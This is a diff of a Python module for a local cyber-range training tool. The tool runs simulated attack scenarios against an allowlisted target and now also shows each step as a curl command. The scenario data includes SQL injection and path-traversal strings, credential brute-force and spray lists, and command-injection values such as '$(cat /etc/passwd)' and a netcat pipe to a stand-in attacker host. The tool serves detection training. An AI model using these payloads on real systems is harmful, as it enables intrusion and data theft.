@@ -1,13 +1,14 @@
 from __future__ import annotations
 
+import json
 import socket
+from collections.abc import Callable
 from dataclasses import dataclass
 from datetime import datetime, timezone
 from typing import Any
-from urllib.parse import urlparse
+from urllib.parse import urlencode, urlparse
 
 import httpx
-
 from app.core.config import settings
 from app.core.exceptions import bad_request
 from app.models.enums import Severity
@@ -109,7 +110,8 @@ RANGE_SCENARIOS: dict[str, RangeScenario] = {
         mitre_techniques=["T1046"],
         target_path="ports 8088-8103",
         cli_examples=[
-            "Use the UI launch button; Docker exposes only the safe HTTP target on 127.0.0.1:8088.",
+            'python3 -c "import socket; socket.create_connection((\'range-target\', 8088), 0.5)"',
+            'curl -s "http://127.0.0.1:8088/health"',
         ],
         safety_notes=["The runner scans only hardcoded range-target ports, never user-supplied hosts."],
         expected_detections=["port_scan"],
@@ -173,6 +175,294 @@ RANGE_SCENARIOS: dict[str, RangeScenario] = {
 }
 
 
+HttpClient = httpx.Client
+RangeStepAction = Callable[[HttpClient, str], None]
+
+
+def _json_for_curl(body: dict[str, Any]) -> str:
+    return json.dumps(body, separators=(",", ":")).replace('"', '\\"')
+
+
+def _optional_headers(client_ip: str | None) -> dict[str, str]:
+    if client_ip:
+        return {"X-Range-Client-Ip": client_ip}
+    return {}
+
+
+def _curl_post(
+    base: str,
+    path: str,
+    body: dict[str, Any],
+    *,
+    extra_headers: dict[str, str] | None = None,
+) -> str:
+    headers = ['-H "Content-Type: application/json"']
+    for key, value in (extra_headers or {}).items():
+        headers.append(f'-H "{key}: {value}"')
+    url = f"{base.rstrip('/')}{path}"
+    return f'curl -s -X POST {url} {" ".join(headers)} -d "{_json_for_curl(body)}"'
+
+
+def _curl_get(
+    base: str,
+    path: str,
+    *,
+    params: dict[str, str] | None = None,
+    extra_headers: dict[str, str] | None = None,
+) -> str:
+    url = f"{base.rstrip('/')}{path}"
+    if params:
+        url = f"{url}?{urlencode(params)}"
+    headers = [f'-H "{key}: {value}"' for key, value in (extra_headers or {}).items()]
+    header_part = f" {' '.join(headers)}" if headers else ""
+    return f"curl -s{header_part} \"{url}\""
+
+
+def _curl_reset(target_url: str) -> str:
+    return (
+        f'curl -s -X POST {target_url.rstrip("/")}/_range/reset '
+        '-H "X-Range-Secret: ***"'
+    )
+
+
+def _curl_drain_logs(target_url: str) -> str:
+    return (
+        f'curl -s {target_url.rstrip("/")}/_range/logs '
+        '-H "X-Range-Secret: ***"'
+    )
+
+
+def _tcp_probe_command(host: str, port: int) -> str:
+    return (
+        f'python3 -c "import socket; socket.create_connection(('
+        f"'{host}', {port}), 0.5)\""
+    )
+
+
+def _build_attack_steps(
+    scenario_id: str,
+    target_url: str,
+    public_url: str,
+    *,
+    client_ip: str | None,
+    scan_ports: list[int],
+) -> list[tuple[str, RangeStepAction]]:
+    """Return (display_command, executor) pairs — one per real HTTP/TCP probe."""
+    hdrs = _optional_headers(client_ip)
+    parsed = urlparse(target_url)
+    internal_host = parsed.hostname or "range-target"
+    scheme = parsed.scheme or "http"
+    steps: list[tuple[str, RangeStepAction]] = []
+
+    if scenario_id == "range_brute_force":
+        passwords = [
+            "password123",
+            "admin",
+            "welcome",
+            "letmein",
+            "qwerty123",
+            "summer2026",
+            "cyberguard",
+            "wrongpass",
+            "demo12345",
+            "changeme2026",
+            "CyberGuard!2026",
+        ]
+        for password in passwords:
+            body = {"username": "admin", "password": password}
+            curl = _curl_post(public_url, "/login", body, extra_headers=hdrs)
+
+            def _post_login(client: HttpClient, base: str, payload: dict = body) -> None:
+                client.post(f"{base.rstrip('/')}/login", json=payload)
+
+            steps.append((curl, _post_login))
+
+    elif scenario_id == "range_sql_injection":
+        payloads = [
+            "normal query",
+            "' OR '1'='1'--",
+            "demo' UNION SELECT username,password FROM users--",
+        ]
+        for payload in payloads:
+            params = {"q": payload}
+            curl = _curl_get(public_url, "/search", params=params, extra_headers=hdrs)
+
+            def _get_search(client: HttpClient, base: str, q: str = payload) -> None:
+                client.get(f"{base.rstrip('/')}/search", params={"q": q})
+
+            steps.append((curl, _get_search))
+
+    elif scenario_id == "range_path_traversal":
+        paths = ["public/readme.txt", "../../etc/passwd", "..\\..\\windows\\win.ini"]
+        for path in paths:
+            params = {"path": path}
+            curl = _curl_get(public_url, "/files", params=params, extra_headers=hdrs)
+
+            def _get_files(client: HttpClient, base: str, p: str = path) -> None:
+                client.get(f"{base.rstrip('/')}/files", params={"path": p})
+
+            steps.append((curl, _get_files))
+
+    elif scenario_id == "range_exfiltration":
+        files = [
+            ("sensitive/customer_database_export.csv", 80),
+            ("sensitive/hr_salary_q4.xlsx", 100),
+            ("sensitive/customer_database_export.csv", 120),
+        ]
+        for filename, size_mb in files:
+            body = {"file": filename, "size_mb": size_mb, "username": "contractor1"}
+            curl = _curl_post(public_url, "/exfil", body, extra_headers=hdrs)
+
+            def _post_exfil(client: HttpClient, base: str, payload: dict = body) -> None:
+                client.post(f"{base.rstrip('/')}/exfil", json=payload)
+
+            steps.append((curl, _post_exfil))
+
+    elif scenario_id == "range_ransomware":
+        curl = _curl_post(public_url, "/ransomware/simulate", {}, extra_headers=hdrs)
+
+        def _post_ransomware(client: HttpClient, base: str) -> None:
+            client.post(f"{base.rstrip('/')}/ransomware/simulate")
+
+        steps.append((curl, _post_ransomware))
+
+    elif scenario_id == "range_port_scan":
+        if client_ip:
+            for port in scan_ports:
+                probe_url = f"{scheme}://{internal_host}:{port}/health"
+                curl = _curl_get(
+                    f"{scheme}://{internal_host}:{port}",
+                    "/health",
+                    extra_headers=hdrs,
+                )
+
+                def _get_health(client: HttpClient, _base: str, url: str = probe_url) -> None:
+                    try:
+                        client.get(url, timeout=2.0)
+                    except httpx.HTTPError:
+                        pass
+
+                steps.append((curl, _get_health))
+        else:
+            for port in scan_ports:
+                curl = _tcp_probe_command(internal_host, port)
+
+                def _tcp_connect(
+                    _client: HttpClient,
+                    _base: str,
+                    host: str = internal_host,
+                    p: int = port,
+                ) -> None:
+                    try:
+                        with socket.create_connection((host, p), timeout=0.5):
+                            pass
+                    except OSError:
+                        pass
+
+                steps.append((curl, _tcp_connect))
+
+    elif scenario_id == "range_dns_tunneling":
+        queries = [
+            "healthcheck.local",
+            "c2VjcmV0LXNlZ21lbnQtMDE=.corp.lab.local",
+            "Y3JlZGVudGlhbD1hZG1pbjpQYXNzMTIz.corp.lab.local",
+            "ZmlsZT1jdXN0b21lcnMuY3N2JmNodW5rPTM=.corp.lab.local",
+            "ZXhmaWw9cGF5cm9sbC1kYXRhJmNoZWNrPTQ=.corp.lab.local",
+        ]
+        for query in queries:
+            body = {"query": query}
+            curl = _curl_post(public_url, "/dns/query", body, extra_headers=hdrs)
+
+            def _post_dns(client: HttpClient, base: str, payload: dict = body) -> None:
+                client.post(f"{base.rstrip('/')}/dns/query", json=payload)
+
+            steps.append((curl, _post_dns))
+
+    elif scenario_id == "range_password_spray":
+        usernames = [
+            "admin",
+            "it.support",
+            "finance.manager",
+            "ceo.assistant",
+            "ops.lead",
+            "analyst",
+            "helpdesk",
+            "intern",
+            "hr.manager",
+            "developer",
+        ]
+        for username in usernames:
+            body = {"username": username, "password": "Winter2026!"}
+            curl = _curl_post(public_url, "/auth/spray", body, extra_headers=hdrs)
+
+            def _post_spray(client: HttpClient, base: str, payload: dict = body) -> None:
+                client.post(f"{base.rstrip('/')}/auth/spray", json=payload)
+
+            steps.append((curl, _post_spray))
+
+    elif scenario_id == "range_command_injection":
+        payloads = [
+            "report.csv",
+            "report.csv; whoami",
+            "backup.tar && id",
+            "$(cat /etc/passwd)",
+            "audit.log | nc attacker.local 4444",
+        ]
+        for payload in payloads:
+            body = {"input": payload}
+            curl = _curl_post(public_url, "/exec", body, extra_headers=hdrs)
+
+            def _post_exec(client: HttpClient, base: str, p: dict = body) -> None:
+                client.post(f"{base.rstrip('/')}/exec", json=p)
+
+            steps.append((curl, _post_exec))
+
+    elif scenario_id == "range_privilege_escalation":
+        actions = [
+            {"username": "analyst", "action": "sudo -l"},
+            {"username": "analyst", "action": "sudo su -"},
+            {"username": "service.backup", "action": "token::elevate"},
+            {"username": "service.backup", "action": "add user to administrators"},
+        ]
+        for item in actions:
+            curl = _curl_post(public_url, "/priv-esc", item, extra_headers=hdrs)
+
+            def _post_priv(client: HttpClient, base: str, payload: dict = item) -> None:
+                client.post(f"{base.rstrip('/')}/priv-esc", json=payload)
+
+            steps.append((curl, _post_priv))
+
+    else:
+        raise bad_request("Unknown range scenario")
+
+    return steps
+
+
+def preview_execution_commands(
+    scenario_id: str,
+    target_url: str,
+    public_url: str,
+    *,
+    client_ip: str | None = None,
+    scan_ports: list[int] | None = None,
+) -> list[str]:
+    """Full script for UI terminal replay (reset → attacks → log drain)."""
+    ports = scan_ports if scan_ports is not None else list(range(8088, 8104))
+    commands = [_curl_reset(target_url)]
+    commands.extend(
+        curl
+        for curl, _ in _build_attack_steps(
+            scenario_id,
+            target_url,
+            public_url,
+            client_ip=client_ip,
+            scan_ports=ports,
+        )
+    )
+    commands.append(_curl_drain_logs(target_url))
+    return commands
+
+
 class RangeAttackRunner:
     allowed_hosts = {"range-target", "localhost", "127.0.0.1"}
     scan_ports = list(range(8088, 8104))
@@ -180,7 +470,14 @@ class RangeAttackRunner:
     def __init__(self) -> None:
         self.target_url = settings.range_target_url.rstrip("/")
         self.public_url = settings.range_public_url.rstrip("/")
+        self._client_ip: str | None = None
         self._assert_allowed_target(self.target_url)
+
+    def _http_client(self, *, timeout: float = 10.0) -> httpx.Client:
+        headers: dict[str, str] = {}
+        if self._client_ip:
+            headers["X-Range-Client-Ip"] = self._client_ip
+        return httpx.Client(timeout=timeout, headers=headers)
 
     def _assert_allowed_target(self, raw_url: str) -> None:
         parsed = urlparse(raw_url)
@@ -190,7 +487,16 @@ class RangeAttackRunner:
             raise bad_request("Range target is outside the local allowlist")
 
     def scenario_public(self, scenario: RangeScenario) -> dict[str, Any]:
-        target = f"{self.public_url}{scenario.target_path}" if scenario.target_path.startswith("/") else scenario.target_path
+        target = (
+            f"{self.public_url}{scenario.target_path}"
+            if scenario.target_path.startswith("/")
+            else scenario.target_path
+        )
+        execution_commands = preview_execution_commands(
+            scenario.id,
+            self.target_url,
+            self.public_url,
+        )
         return {
             "id": scenario.id,
             "name": scenario.name,
@@ -201,6 +507,7 @@ class RangeAttackRunner:
             "execution_mode": "local_range",
             "target_url": target,
             "cli_examples": scenario.cli_examples,
+            "execution_commands": execution_commands,
             "safety_notes": scenario.safety_notes,
             "expected_detections": scenario.expected_detections,
         }
@@ -217,7 +524,7 @@ class RangeAttackRunner:
             return False, f"Range target is unavailable: {exc}"
 
     def reset(self) -> None:
-        with httpx.Client(timeout=10.0) as client:
+        with self._http_client() as client:
             resp = client.post(
                 f"{self.target_url}/_range/reset",
                 headers={"X-Range-Secret": settings.range_shared_secret},
@@ -225,7 +532,7 @@ class RangeAttackRunner:
             resp.raise_for_status()
 
     def drain_logs(self) -> list[dict[str, Any]]:
-        with httpx.Client(timeout=10.0) as client:
+        with self._http_client() as client:
             resp = client.get(
                 f"{self.target_url}/_range/logs",
                 headers={"X-Range-Secret": settings.range_shared_secret},
@@ -235,144 +542,39 @@ class RangeAttackRunner:
         logs = data.get("logs", [])
         return logs if isinstance(logs, list) else []
 
-    def run(self, scenario_id: str) -> tuple[RangeScenario, int, list[dict[str, Any]]]:
+    def run(
+        self,
+        scenario_id: str,
+        *,
+        client_ip: str | None = None,
+    ) -> tuple[RangeScenario, int, list[dict[str, Any]], list[str]]:
         if not settings.range_enabled:
             raise bad_request("Cyber range is disabled")
         scenario = RANGE_SCENARIOS.get(scenario_id)
         if not scenario:
             raise bad_request("Unknown range scenario")
-        requests = getattr(self, f"_run_{scenario_id}")()
-        logs = self.drain_logs()
-        return scenario, requests, logs
-
-    def _run_range_brute_force(self) -> int:
-        attempts = [
-            "password123",
-            "admin",
-            "welcome",
-            "letmein",
-            "qwerty123",
-            "summer2026",
-            "cyberguard",
-            "wrongpass",
-            "demo12345",
-            "changeme2026",
-            "CyberGuard!2026",
-        ]
-        with httpx.Client(timeout=10.0) as client:
-            for password in attempts:
-                client.post(
-                    f"{self.target_url}/login",
-                    json={"username": "admin", "password": password},
-                )
-        return len(attempts)
-
-    def _run_range_sql_injection(self) -> int:
-        payloads = [
-            "normal query",
-            "' OR '1'='1'--",
-            "demo' UNION SELECT username,password FROM users--",
-        ]
-        with httpx.Client(timeout=10.0) as client:
-            for payload in payloads:
-                client.get(f"{self.target_url}/search", params={"q": payload})
-        return len(payloads)
-
-    def _run_range_path_traversal(self) -> int:
-        paths = ["public/readme.txt", "../../etc/passwd", "..\\..\\windows\\win.ini"]
-        with httpx.Client(timeout=10.0) as client:
-            for path in paths:
-                client.get(f"{self.target_url}/files", params={"path": path})
-        return len(paths)
-
-    def _run_range_exfiltration(self) -> int:
-        files = [
-            "sensitive/customer_database_export.csv",
-            "sensitive/hr_salary_q4.xlsx",
-            "sensitive/customer_database_export.csv",
-        ]
-        with httpx.Client(timeout=10.0) as client:
-            for idx, filename in enumerate(files):
-                client.post(
-                    f"{self.target_url}/exfil",
-                    json={"file": filename, "size_mb": 80 + (idx * 20), "username": "contractor1"},
-                )
-        return len(files)
-
-    def _run_range_ransomware(self) -> int:
-        with httpx.Client(timeout=10.0) as client:
-            client.post(f"{self.target_url}/ransomware/simulate")
-        return 1
-
-    def _run_range_port_scan(self) -> int:
-        parsed = urlparse(self.target_url)
-        host = parsed.hostname or "range-target"
-        for port in self.scan_ports:
-            try:
-                with socket.create_connection((host, port), timeout=0.5):
-                    pass
-            except OSError:
-                pass
-        return len(self.scan_ports)
-
-    def _run_range_dns_tunneling(self) -> int:
-        queries = [
-            "healthcheck.local",
-            "c2VjcmV0LXNlZ21lbnQtMDE=.corp.lab.local",
-            "Y3JlZGVudGlhbD1hZG1pbjpQYXNzMTIz.corp.lab.local",
-            "ZmlsZT1jdXN0b21lcnMuY3N2JmNodW5rPTM=.corp.lab.local",
-            "ZXhmaWw9cGF5cm9sbC1kYXRhJmNoZWNrPTQ=.corp.lab.local",
-        ]
-        with httpx.Client(timeout=10.0) as client:
-            for query in queries:
-                client.post(f"{self.target_url}/dns/query", json={"query": query})
-        return len(queries)
-
-    def _run_range_password_spray(self) -> int:
-        usernames = [
-            "admin",
-            "it.support",
-            "finance.manager",
-            "ceo.assistant",
-            "ops.lead",
-            "analyst",
-            "helpdesk",
-            "intern",
-            "hr.manager",
-            "developer",
-        ]
-        with httpx.Client(timeout=10.0) as client:
-            for username in usernames:
-                client.post(
-                    f"{self.target_url}/auth/spray",
-                    json={"username": username, "password": "Winter2026!"},
-                )
-        return len(usernames)
-
-    def _run_range_command_injection(self) -> int:
-        payloads = [
-            "report.csv",
-            "report.csv; whoami",
-            "backup.tar && id",
-            "$(cat /etc/passwd)",
-            "audit.log | nc attacker.local 4444",
-        ]
-        with httpx.Client(timeout=10.0) as client:
-            for payload in payloads:
-                client.post(f"{self.target_url}/exec", json={"input": payload})
-        return len(payloads)
-
-    def _run_range_privilege_escalation(self) -> int:
-        actions = [
-            {"username": "analyst", "action": "sudo -l"},
-            {"username": "analyst", "action": "sudo su -"},
-            {"username": "service.backup", "action": "token::elevate"},
-            {"username": "service.backup", "action": "add user to administrators"},
-        ]
-        with httpx.Client(timeout=10.0) as client:
-            for item in actions:
-                client.post(f"{self.target_url}/priv-esc", json=item)
-        return len(actions)
+        self._client_ip = client_ip
+        executed_commands: list[str] = [_curl_reset(self.target_url)]
+        try:
+            self.reset()
+            steps = _build_attack_steps(
+                scenario_id,
+                self.target_url,
+                self.public_url,
+                client_ip=client_ip,
+                scan_ports=self.scan_ports,
+            )
+            with self._http_client(
+                timeout=2.0 if scenario_id == "range_port_scan" and client_ip else 10.0
+            ) as client:
+                for curl_line, action in steps:
+                    executed_commands.append(curl_line)
+                    action(client, self.target_url)
+            executed_commands.append(_curl_drain_logs(self.target_url))
+            logs = self.drain_logs()
+            return scenario, len(steps), logs, executed_commands
+        finally:
+            self._client_ip = None
 
 
 def logs_to_events(logs: list[dict[str, Any]]) -> list[EventCreate]:
